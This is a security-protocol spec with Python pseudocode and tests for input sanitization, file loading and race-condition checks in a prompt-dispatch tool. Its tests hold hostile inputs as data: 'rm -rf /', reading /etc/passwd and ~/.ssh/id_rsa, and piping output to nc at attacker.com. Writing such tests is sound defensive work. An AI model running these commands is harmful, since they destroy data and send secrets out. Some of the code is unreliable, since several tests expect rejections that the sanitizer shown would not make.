# PROMPT_MAKER Security Protocols v2.0.1

**Version:** 2.0.1
**Date:** 2025-12-11
**Purpose:** Security and reliability protocols for PROMPT_MAKER implementation
**Status:** CRITICAL - Must be followed for all implementations
**Changelog:** v2.0.1 - Applied FIX-001: URL decoding before path traversal check (CRITICAL SECURITY PATCH)

---

## OVERVIEW

This document specifies **mandatory security protocols** that MUST be implemented before PROMPT_MAKER v2.0 deployment. These protocols address critical vulnerabilities identified in hostile review.

**Security Score Target:** 10/10 (from current 5/10)

---

## PROTOCOL 1: FAULT-TOLERANT FILE LOADING

### 1.1 Problem Statement

**CRITICAL VULNERABILITY (CRIT-001):**
- No error handling for permission denied, corrupted files, or I/O failures
- System crashes instead of degrading gracefully
- No retry logic for transient errors

### 1.2 Mandatory Implementation

**ALL file reads MUST use this protocol:**

```python
# PSEUDOCODE - Represents algorithm to be implemented

class FileLoadResult:
    success: bool
    content: Optional[str]
    error: Optional[str]

def load_file_with_retry(file_path: str, max_retries: int = 3) -> FileLoadResult:
    """
    Load file with exponential backoff retry.

    Error Handling Matrix:
    - FileNotFoundError → No retry, return error
    - PermissionError → Retry 3x with backoff
    - UnicodeDecodeError → No retry, report encoding issue
    - OSError (I/O) → Retry 3x with backoff
    - Timeout → Retry 3x with backoff
    """

    for attempt in range(max_retries):
        try:
            # Security: Validate path is within allowed directories
            if not is_path_allowed(file_path):
                return FileLoadResult(False, None, "Path outside allowed directories")

            # Attempt read with UTF-8 encoding
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()

            return FileLoadResult(True, content, None)

        except FileNotFoundError:
            return FileLoadResult(False, None, f"File not found: {file_path}")

        except PermissionError:
            if attempt < max_retries - 1:
                sleep(0.1 * (2 ** attempt))  # Exponential backoff
                continue
            return FileLoadResult(False, None, f"Permission denied: {file_path}")

        except UnicodeDecodeError:
            return FileLoadResult(False, None, f"Invalid UTF-8 encoding: {file_path}")

        except OSError as e:
            if attempt < max_retries - 1:
                sleep(0.1 * (2 ** attempt))
                continue
            return FileLoadResult(False, None, f"I/O error: {e}")

    return FileLoadResult(False, None, "Max retries exceeded")
```

### 1.3 Error Message Templates

**When file operations fail, use these exact templates:**

**Missing File:**
```markdown
❌ CRITICAL ERROR: Required File Missing

File: {file_path}
Purpose: {why_needed}
Locations Checked:
  - {primary_location} (not found)
  - {fallback_location} (not found)

Action Required:
1. Verify .claude/ directory structure exists
2. Restore from version control:
   git checkout {file_path}
3. Or regenerate: {regeneration_command}

Cannot proceed until file is restored.
```

**Permission Denied:**
```markdown
❌ FILE ACCESS ERROR: Permission Denied

File: {file_path}
Error: Cannot read file (permission denied)

Action Required:
1. Check file permissions:
   ls -l {file_path}
2. Grant read access:
   chmod +r {file_path}
3. Retry: /dispatch

Attempted {retry_count} times.
```

**Corrupted File:**
```markdown
⚠️ FILE CORRUPTION WARNING

File: {file_path}
Issue: Invalid encoding (expected UTF-8)
Bytes: {hex_preview}

Action Required:
1. Restore from backup:
   git checkout {file_path}
2. Or manually verify file contents
3. Ensure file is UTF-8 encoded

Fallback: Assuming safe defaults (may cause issues).
```

### 1.4 Validation Tests

**REQUIRED TESTS (must pass before deployment):**

```python
def test_file_error_handling():
    # Test 1: Missing file
    result = load_file_with_retry("nonexistent.md")
    assert not result.success
    assert "not found" in result.error.lower()

    # Test 2: Permission denied (simulate)
    # Create read-only file, attempt read, verify error

    # Test 3: Binary file (not UTF-8)
    # Create binary file, verify encoding error

    # Test 4: Path traversal attempt
    result = load_file_with_retry("../../../../etc/passwd")
    assert not result.success
    assert "outside allowed" in result.error.lower()
```

---

## PROTOCOL 2: ATOMIC PHASE DETECTION (TOCTOU PREVENTION)

### 2.1 Problem Statement

**CRITICAL VULNERABILITY (CRIT-002):**
- Time-of-check to time-of-use (TOCTOU) race condition
- Phase can change between check and use
- Allows contract violations in multi-user/CI environments

### 2.2 Mandatory Implementation

**Phase detection MUST use atomic snapshots:**

```python
# PSEUDOCODE - Represents algorithm to be implemented

class SystemSnapshot:
    """Immutable snapshot of system state at a specific moment."""
    timestamp: float
    phase: str  # "Architecture" | "Planning" | "Implementation" | "Polish"
    gate_status: Dict[str, bool]  # {gate_1: True, gate_2: False, ...}
    file_hashes: Dict[str, str]  # For tamper detection

def create_system_snapshot() -> SystemSnapshot:
    """
    Create atomic snapshot of current system state.
    ALL subsequent decisions MUST use this snapshot (not live files).
    """

    # Load all critical files atomically
    readme = load_file_with_retry("README.md")
    gate_1 = load_file_with_retry("GATE_1_COMPLETE.md")
    gate_2 = load_file_with_retry("GATE_2_COMPLETE.md")
    gate_3 = load_file_with_retry("GATE_3_COMPLETE.md")
    gate_4 = load_file_with_retry("GATE_4_COMPLETE.md")

    # Halt if critical files unavailable
    if not readme.success:
        raise SystemError(f"Cannot create snapshot: {readme.error}")

    # Detect phase from gates
    phase = detect_phase_from_gates(gate_1.success, gate_2.success, gate_3.success, gate_4.success)

    # Compute file hashes for tamper detection
    file_hashes = {
        'README.md': sha256_hash(readme.content),
        'GATE_1': sha256_hash(gate_1.content) if gate_1.success else "",
        'GATE_2': sha256_hash(gate_2.content) if gate_2.success else "",
    }

    return SystemSnapshot(
        timestamp=current_time(),
        phase=phase,
        gate_status={'gate_1': gate_1.success, 'gate_2': gate_2.success, 'gate_3': gate_3.success, 'gate_4': gate_4.success},
        file_hashes=file_hashes
    )

def validate_snapshot_current(snapshot: SystemSnapshot, max_age_seconds: float = 5.0) -> bool:
    """
    Verify snapshot is still valid (files haven't changed).

    Returns:
        True if snapshot is current, False if files modified
    """
    # Check age
    if current_time() - snapshot.timestamp > max_age_seconds:
        return False

    # Recompute file hashes and compare
    for filename, expected_hash in snapshot.file_hashes.items():
        current_hash = compute_current_hash(filename)
        if current_hash != expected_hash:
            return False  # File was modified

    return True
```

### 2.3 Usage Pattern

**EVERY /dispatch invocation MUST follow this pattern:**

```python
def generate_prompt_safely(user_request: str) -> str:
    # Step 1: Create atomic snapshot
    snapshot = create_system_snapshot()

    # Step 2: ALL checks use snapshot (not live files)
    phase_check = check_phase_allowed(user_request, snapshot.phase)
    contract_check = check_contracts(user_request, snapshot)

    # Step 3: Validate snapshot still current before proceeding
    if not validate_snapshot_current(snapshot):
        return "⚠️ System state changed during processing. Please retry /dispatch"

    # Step 4: Generate prompt using snapshot data
    if phase_check.allowed and contract_check.passed:
        return generate_prompt(user_request, snapshot)
    else:
        return format_violation_message(phase_check, contract_check)
```

### 2.4 Staleness Warning

**If snapshot becomes stale, emit this warning:**

```markdown
⚠️ PHASE STATUS WARNING

Phase snapshot created at: {timestamp}
Current time: {current_time} ({elapsed} seconds)

Project state may have changed.

Recommendation: Re-run /dispatch to get fresh phase detection.
```

### 2.5 Validation Tests

```python
def test_toctou_prevention():
    # Test 1: Detect file modification during processing
    snapshot = create_system_snapshot()

    # Simulate file modification
    modify_file("README.md", "append", "# Modified")

    assert not validate_snapshot_current(snapshot), "Should detect modification"

    # Test 2: Reject stale snapshots
    snapshot.timestamp = current_time() - 10.0  # 10 seconds old
    assert not validate_snapshot_current(snapshot, max_age_seconds=5.0)

    # Test 3: Accept current snapshots
    snapshot = create_system_snapshot()
    assert validate_snapshot_current(snapshot)
```

---

## PROTOCOL 3: INPUT SANITIZATION (INJECTION PREVENTION)

### 3.1 Problem Statement

**CRITICAL VULNERABILITY (CRIT-003):**
- No input validation allows path traversal attacks
- No protection against command injection
- No protection against constraint injection

### 3.2 Mandatory Implementation

**ALL user inputs MUST pass through this validation:**

```python
# PSEUDOCODE - Represents algorithm to be implemented

class InputValidationError(Exception):
    pass

class SanitizedInput:
    original: str
    sanitized: str
    extracted_paths: List[str]

def sanitize_user_input(raw_input: str) -> SanitizedInput:
    """
    Sanitize user input to prevent injection attacks.

    Validates:
    - Length limits (max 10,000 characters exactly)
    - No null bytes
    - No control characters (in file paths only)
    - No shell metacharacters (in file paths only)
    - No path traversal patterns (including URL-encoded)

    SECURITY FIXES (v2.0.1):
    - FIX-001: URL decoding before path traversal check (prevents %2e%2e%2f bypass) ✅ APPLIED
    - FIX-002: Allow newlines in main input, block only in file paths ✅ APPLIED
    """
    import urllib.parse

    # Step 1: Length validation
    MAX_LENGTH = 10000  # Exactly 10,000 characters
    if len(raw_input) > MAX_LENGTH:
        raise InputValidationError(f"Input exceeds {MAX_LENGTH} character limit")

    # Step 2: Null byte check (entire input)
    if '\x00' in raw_input:
        raise InputValidationError("Null bytes not allowed")

    # Step 3: URL decode to catch encoded attacks (FIX-001: CRITICAL SECURITY FIX) ✅
    try:
        decoded_input = urllib.parse.unquote(raw_input)
    except Exception:
        decoded_input = raw_input  # If decode fails, use original

    # Step 4: Path traversal detection on DECODED input (FIX-001) ✅
    # This catches %2e%2e%2f (URL-encoded ../) attacks
    if '..' in decoded_input or '~/' in decoded_input:
        raise InputValidationError("Path traversal pattern detected")

    # Step 5: Extract and validate file paths
    extracted_paths = extract_safe_paths(decoded_input)

    # Step 6: Check dangerous characters ONLY in extracted paths (FIX-002)
    # This allows newlines in main input for multi-line prompts
    DANGEROUS_CHARS = [';', '|', '&', '$', '`', '(', ')', '<', '>']
    for path in extracted_paths:
        # Check for dangerous chars and newlines in paths only
        for char in DANGEROUS_CHARS + ['\n', '\r']:
            if char in path:
                raise InputValidationError(f"Dangerous character in path: '{char}'")

    # Step 7: Remove excessive whitespace (preserve newlines in main content)
    sanitized = normalize_whitespace(raw_input, preserve_newlines=True)

    return SanitizedInput(
        original=raw_input,
        sanitized=sanitized,
        extracted_paths=extracted_paths
    )

def extract_safe_paths(text: str) -> List[str]:
    """
    Extract file paths and validate they're within allowed directories.
    """
    ALLOWED_ROOTS = [
        resolve_path(".claude"),
        resolve_path("docs"),
        resolve_path("src"),
    ]

    # Extract potential paths (*.md, *.rs, etc.)
    potential_paths = find_file_patterns(text)

    validated = []
    for path_str in potential_paths:
        path = resolve_path(path_str)

        # Check if within allowed directories
        if any(path.startswith(root) for root in ALLOWED_ROOTS):
            validated.append(path)
        else:
            log_warning(f"Path outside allowed directories: {path_str}")

    return validated
```

### 3.3 Attack Vector Protection

**MUST block these attack vectors:**

| Attack Vector | Detection | Response |
|:--------------|:----------|:---------|
| Path Traversal `../../../../etc/passwd` | Pattern `..` detected | Reject with "Path traversal detected" |
| Command Injection `; rm -rf /` | Shell metachar `;` detected | Reject with "Dangerous character: ';'" |
| Null Byte Injection `file.md\x00.txt` | Null byte `\x00` detected | Reject with "Null bytes not allowed" |
| Resource Exhaustion | Length > 10k characters | Reject with "Input too long" |
| Unknown Agent `@FAKE_AGENT` | Not in agent registry | Reject with "Unknown agent" |

### 3.4 Error Messages

**When input validation fails:**

```markdown
❌ INPUT VALIDATION FAILED

Input: {truncated_input}
Issue: {specific_issue}

Security Check Failed:
- {check_name}: FAILED
- Detected: {what_was_detected}

Action Required:
1. Remove dangerous patterns from input
2. Use only allowed characters
3. Retry with sanitized input

Examples of allowed input:
- "Generate prompt for vector query implementation"
- "Design the HNSW index structure"
- "Review ARCHITECTURE.md"
```

### 3.5 Validation Tests

```python
def test_input_sanitization():
    # Test 1: Path traversal
    try:
        sanitize_user_input("Read ../../../../etc/passwd")
        assert False, "Should have raised InputValidationError"
    except InputValidationError as e:
        assert "path traversal" in str(e).lower()

    # Test 2: Command injection
    try:
        sanitize_user_input("Generate prompt; rm -rf /")
        assert False
    except InputValidationError as e:
        assert "dangerous character" in str(e).lower()

    # Test 3: Null bytes
    try:
        sanitize_user_input("input\x00payload")
        assert False
    except InputValidationError as e:
        assert "null byte" in str(e).lower()

    # Test 4: Valid input passes
    result = sanitize_user_input("Generate prompt for implementation")
    assert result.sanitized == "Generate prompt for implementation"
```

---

## PROTOCOL 4: CANONICAL FILE LOCATIONS

### 4.1 Problem Statement

**MAJOR ISSUE (MAJOR-002):**
- Ambiguous file locations (.claude/ vs root)
- No precedence rules
- No migration path from old to new locations

### 4.2 Authoritative File Map

**These are the ONLY valid file locations:**

```yaml
CANONICAL_PATHS:
  # Critical configuration files
  claude_md: ".claude/CLAUDE.md"
  workflow_router: ".claude/WORKFLOW_ROUTER.md"
  settings: ".claude/settings.json"

  # Gate files (primary location)
  gate_1: "GATE_1_COMPLETE.md"
  gate_2: "GATE_2_COMPLETE.md"
  gate_3: "GATE_3_COMPLETE.md"
  gate_4: "GATE_4_COMPLETE.md"

  # Gate files (fallback location for compatibility)
  gate_1_fallback: ".claude/GATE_1_COMPLETE.md"
  gate_2_fallback: ".claude/GATE_2_COMPLETE.md"

  # Architecture documents
  architecture: "docs/architecture/ARCHITECTURE.md"
  data_layout: "docs/architecture/DATA_LAYOUT.md"
  wasm_boundary: "docs/architecture/WASM_BOUNDARY.md"
  test_strategy: "docs/architecture/TEST_STRATEGY.md"

  # Planning documents
  roadmap: "docs/planning/ROADMAP.md"
  weekly_plan: "WEEKLY_TASK_PLAN.md"

  # Project root files
  readme: "README.md"

  # Agent definitions
  agents_dir: ".claude/agents/"
  commands_dir: ".claude/commands/"
```

### 4.3 File Resolution Algorithm

```python
def resolve_canonical_path(file_key: str) -> Optional[str]:
    """
    Resolve file to canonical path with fallback support.
    """
    primary = CANONICAL_PATHS[file_key]
    fallback = CANONICAL_PATHS.get(f"{file_key}_fallback")

    if file_exists(primary):
        return primary
    elif fallback and file_exists(fallback):
        log_warning(f"Using fallback location for {file_key}: {fallback}")
        return fallback
    else:
        return None
```

### 4.4 Conflict Resolution

**If file exists in both locations:**

```markdown
⚠️ FILE LOCATION CONFLICT

File: GATE_1_COMPLETE.md
Found in multiple locations:
  - GATE_1_COMPLETE.md (primary, v2.0 location)
  - .claude/GATE_1_COMPLETE.md (fallback, v1.x location)

Using: GATE_1_COMPLETE.md (primary)

Recommendation: Delete .claude/GATE_1_COMPLETE.md to avoid confusion.
Migration command: rm .claude/GATE_1_COMPLETE.md
```

---

## PROTOCOL 5: INTENT CLASSIFICATION ALGORITHM

### 5.1 Problem Statement

**MAJOR ISSUE (MAJOR-001):**
- Ambiguous task matching ("implement insert" → which task?)
- No algorithm specified
- No confidence scores

### 5.2 Weighted Keyword Matching

```python
# PSEUDOCODE - Represents classification algorithm

INTENT_KEYWORDS = {
    'META_ARCHITECT': {
        'design': 1.0, 'architect': 1.0, 'structure': 0.9,
        'system': 0.6, 'component': 0.7
    },
    'RUST_ENGINEER': {
        'implement': 1.0, 'code': 0.9, 'build': 0.9,
        'function': 0.8, 'module': 0.8
    },
    'DOCWRITER': {
        'document': 1.0, 'readme': 1.0, 'typo': 1.0,
        'fix': 0.6  # Only for documentation fixes
    },
    # ... other agents
}

def classify_intent(user_request: str, snapshot: SystemSnapshot) -> Classification:
    """
    Classify user intent using weighted keyword matching.

    Returns:
        Classification with agent, confidence, and reasoning
    """
    tokens = tokenize(user_request.lower())

    agent_scores = {}
    for agent, keywords in INTENT_KEYWORDS.items():
        score = 0.0
        for token in tokens:
            if token in keywords:
                score += keywords[token]
        agent_scores[agent] = score

    # Apply context modifiers based on phase
    if snapshot.phase == "Architecture":
        agent_scores['META_ARCHITECT'] *= 1.5
    elif snapshot.phase == "Implementation":
        agent_scores['RUST_ENGINEER'] *= 1.2

    # Select best match
    best_agent = max(agent_scores, key=agent_scores.get)
    best_score = agent_scores[best_agent]

    # Normalize confidence (0.0 to 1.0)
    confidence = min(best_score / 3.0, 1.0)

    # Require minimum confidence
    if confidence < 0.3:
        return Classification(agent='AMBIGUOUS', confidence=confidence)

    return Classification(agent=best_agent, confidence=confidence)
```

### 5.3 Ambiguity Resolution

**When confidence < 0.3:**

```markdown
📋 REQUEST CLARIFICATION NEEDED

Your request: "{user_request}"

Intent unclear. Confidence: {confidence:.0%} (threshold: 30%)

Please clarify:

**Option A: Architecture/Design**
- Command: /architect-design {component}
- Use if: You want to design system structure

**Option B: Implementation**
- Command: /rust-implement W{N}.{X}
- Use if: You want to write code

**Option C: Documentation**
- Command: /doc-readme
- Use if: You want to update docs

Which option matches your intent?
```

---

## IMPLEMENTATION PRIORITY

**Week 1 (CRITICAL - Blocking Deployment):**
1. ✅ Implement Protocol 1: File Error Handling
2. ✅ Implement Protocol 2: TOCTOU Prevention
3. ✅ Implement Protocol 3: Input Sanitization
4. ✅ Write security tests (attack vector validation)

**Week 2 (HIGH - Production Readiness):**
5. ✅ Implement Protocol 4: Canonical File Locations
6. ✅ Implement Protocol 5: Intent Classification
7. ✅ Performance optimization
8. ✅ Integration testing

**Acceptance Criteria:**
- All security tests pass (100%)
- All attack vectors blocked (5/5)
- No critical vulnerabilities in audit
- Security score: 10/10

---

## VERIFICATION CHECKLIST

**Before marking PROMPT_MAKER v2.0 as production-ready:**

### Critical Security Checks

- [ ] **File Error Handling:**
  - [ ] Missing files handled gracefully
  - [ ] Permission errors have retry logic
  - [ ] Encoding errors reported clearly
  - [ ] I/O errors don't crash system

- [ ] **TOCTOU Prevention:**
  - [ ] Atomic snapshots implemented
  - [ ] Stale snapshots rejected
  - [ ] File modifications detected
  - [ ] Concurrent execution safe

- [ ] **Input Sanitization:**
  - [ ] Path traversal blocked
  - [ ] Command injection blocked
  - [ ] Null bytes rejected
  - [ ] Unknown agents rejected
  - [ ] Length limits enforced

### Integration Checks

- [ ] All protocols work together
- [ ] No performance degradation
- [ ] Error messages are actionable
- [ ] Test suite passes (90%+ coverage)
- [ ] Security audit completed

### Documentation Checks

- [ ] All protocols documented
- [ ] Examples provided for each protocol
- [ ] Migration guide updated
- [ ] API reference current
- [ ] Troubleshooting guide complete

---

## APPENDIX: ATTACK VECTOR TEST SUITE

```python
# test_security.py - Comprehensive attack vector validation

def test_path_traversal_attacks():
    """Validate all path traversal variants are blocked."""
    attacks = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\system32",
        "/etc/passwd",
        "~/. ssh/id_rsa",
        "%2e%2e%2f",  # URL encoded
    ]

    for attack in attacks:
        try:
            sanitize_user_input(f"Read {attack}")
            assert False, f"Path traversal not blocked: {attack}"
        except InputValidationError:
            pass  # Expected

def test_command_injection_attacks():
    """Validate command injection is blocked."""
    attacks = [
        "prompt; rm -rf /",
        "prompt && cat /etc/passwd",
        "prompt | nc attacker.com 1234",
        "prompt `whoami`",
        "prompt $(whoami)",
    ]

    for attack in attacks:
        try:
            sanitize_user_input(attack)
            assert False, f"Command injection not blocked: {attack}"
        except InputValidationError:
            pass

def test_resource_exhaustion_attacks():
    """Validate resource exhaustion is prevented."""
    # Test 1: Excessive input length
    huge_input = "A" * 100000
    try:
        sanitize_user_input(huge_input)
        assert False, "Length limit not enforced"
    except InputValidationError:
        pass

    # Test 2: Deeply nested paths (stack exhaustion)
    # Test 3: Circular constraint references
    # ... (see full test suite)

# Run with: pytest test_security.py -v
```

---

**END OF SECURITY PROTOCOLS**

*Version: 2.0.0*
*Status: MANDATORY FOR DEPLOYMENT*
*Compliance: Required for production release*
